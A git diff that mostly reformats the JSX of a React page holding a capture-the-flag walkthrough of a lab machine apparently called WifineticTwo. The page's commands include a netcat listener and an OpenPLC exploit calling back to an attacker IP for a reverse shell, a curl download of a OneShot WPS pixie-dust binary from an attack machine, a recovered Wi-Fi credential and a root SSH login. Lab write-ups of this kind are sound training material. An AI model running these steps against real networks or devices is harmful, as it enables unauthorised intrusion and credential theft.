@@ -28,7 +28,7 @@ export default function Page() {
             return "No posts found";
         }
     };
-    
+
     const date = findDate('Wifinetic');
 
     const items = [
@@ -84,13 +84,13 @@ export default function Page() {
             </div>
             <div id="exploitation" className="my-2">
                 <SubHeader item={{ num: '3', content: 'Enumeration' }} />
-                <SubPara content={'Download the Python code provided in the link. However, it currently doesn &apos;t work due to incorrect configurations in the file. You need to make alterations as shown in the image below."'}/>
+                <SubPara content={'Download the Python code provided in the link. However, it currently doesn &apos;t work due to incorrect configurations in the file. You need to make alterations as shown in the image below."'} />
                 <SubImage img={{
                     alt: 'config file',
                     path: '/images/wifinetictwo/configfile.png',
                     size: 400
-                }}/>
-                <SubPara content={'In the terminal. Type:'}/>
+                }} />
+                <SubPara content={'In the terminal. Type:'} />
                 <Code color="success">nc -lnvp 4444 (can use other port)</Code>
                 <SubPara content={'Other terminal.Run exploit code Type: '} />
                 <Code color="success">python 49803 -u http://&lt;host&gt;:8080 -l openplc -p openplc -i 10.10.14.18 -r 4444</Code>
@@ -98,71 +98,81 @@ export default function Page() {
                     alt: 'exploit 1',
                     path: '/images/wifinetictwo/exl1.png',
                     size: 400
-                }}/>
+                }} />
                 <SubImage img={{
                     alt: 'exploit 2',
                     path: '/images/wifinetictwo/exl2.png',
                     size: 400
-                }}/>
-                <Code color="warning">Completely! User step.</Code>
+                }} />
+                <div className="overflow-x-auto">
+                    <Code color="warning">Completely! User step.</Code>
+                </div>
             </div>
             <div id="privilegeescalation" className="my-2">
                 <SubHeader item={{ num: '4', content: 'Privilege Escalation' }} />
-                <SubPara content={'You can check the network status by using the ifconfig command. If wlan0 is active, it indicates that the Wi-Fi is working. You can exploit this either by conducting a brute-force attack or by using a pixie dust attack. You can clone code from the repo below and build it after that tranfer it to targer server and exploit.'}/>
+                <SubPara content={'You can check the network status by using the ifconfig command. If wlan0 is active, it indicates that the Wi-Fi is working. You can exploit this either by conducting a brute-force attack or by using a pixie dust attack. You can clone code from the repo below and build it after that tranfer it to targer server and exploit.'} />
                 <SubImage img={{
                     alt: 'exploit 2',
                     path: '/images/wifinetictwo/network.png',
                     size: 400
-                }}/>
+                }} />
                 <Link
                     href={'https://github.com/nikita-yfh/OneShot-C'}
                     color="warning"
                     underline="hover"
                     target="_blank"
                 >OneShot-C program</Link>
-                <SubPara content={'Run server http at attack machine. '}/>
-                <Code color="success">python3 -m http.server 9999</Code>
-                <SubPara content={'In target machine, get file exec is built from program. and add permission for this!'}/>
-                <Code color="success" className="my-3">curl http://&lt;attack_machine&gt;:9999/oneshot -O oneshot</Code><br />
-                <SubPara content={'Run oneshot program.'}/>
-                <Code color="success"className="my-3">./oneshot -i wlan0 -K</Code>
+                <SubPara content={'Run server http at attack machine. '} />
+                <div className="overflow-x-auto">
+                    <Code color="success">python3 -m http.server 9999</Code>
+                </div>
+                <SubPara content={'In target machine, get file exec is built from program. and add permission for this!'} />
+                <div className="overflow-x-auto">
+                    <Code color="success" className="my-3 ">curl http://&lt;attack_machine&gt;:9999/oneshot -O oneshot</Code><br />
+                </div>
+                <SubPara content={'Run oneshot program.'} />
+                <Code color="success" className="my-3">./oneshot -i wlan0 -K</Code>
                 <SubImage img={{
                     alt: 'scan 1',
                     path: '/images/wifinetictwo/scan1.png',
                     size: 400
-                }}/>
+                }} />
                 <SubImage img={{
                     alt: 'scan 2',
                     path: '/images/wifinetictwo/scan2.png',
                     size: 400
-                }}/>
-                <SubPara content={'Ok. We have ssid and wpa psk.'}/>
-                <Code color="warning">plcrouter:NoWWEDoKnowWhaTisReal123!</Code>
-                <SubPara content={'Using this cresidential login wifi. You can search internet or ask openai about `using wpa_supplicant connect Wi-Fi.`'}/>
+                }} />
+                <SubPara content={'Ok. We have ssid and wpa psk.'} />
+                <div className="overflow-x-auto">
+                    <Code color="warning">plcrouter:NoWWEDoKnowWhaTisReal123!</Code>
+                </div>
+                <SubPara content={'Using this cresidential login wifi. You can search internet or ask openai about `using wpa_supplicant connect Wi-Fi.`'} />
                 <SubImage img={{
                     alt: 'wifi 1',
                     path: '/images/wifinetictwo/wifi1.png',
                     size: 400
-                }}/>
+                }} />
                 <SubImage img={{
                     alt: 'wifi 2',
                     path: '/images/wifinetictwo/wifi2.png',
                     size: 400
-                }}/>
+                }} />
                 <SubImage img={{
                     alt: 'wifi 3',
                     path: '/images/wifinetictwo/wifi3.png',
                     size: 400
-                }}/>
-                <SubPara content={'Continue and guess. You notice that the SSH service has a weak password setup. You can log in as the root user and retrieve the flag."'}/>
+                }} />
+                <SubPara content={'Continue and guess. You notice that the SSH service has a weak password setup. You can log in as the root user and retrieve the flag."'} />
                 <SubImage img={{
                     alt: 'wifi 4',
                     path: '/images/wifinetictwo/wifi4.png',
                     size: 400
-                }}/>
-                <Code color="warning" className="my-3">This challenge has been completed</Code>
+                }} />
+                <div className="overflow-x-auto">
+                    <Code color="warning" className="my-3">This challenge has been completed</Code>
+                </div>
             </div>
-        <FooterBlog date={date}/>
+            <FooterBlog date={date} />
         </div>
     );
 }
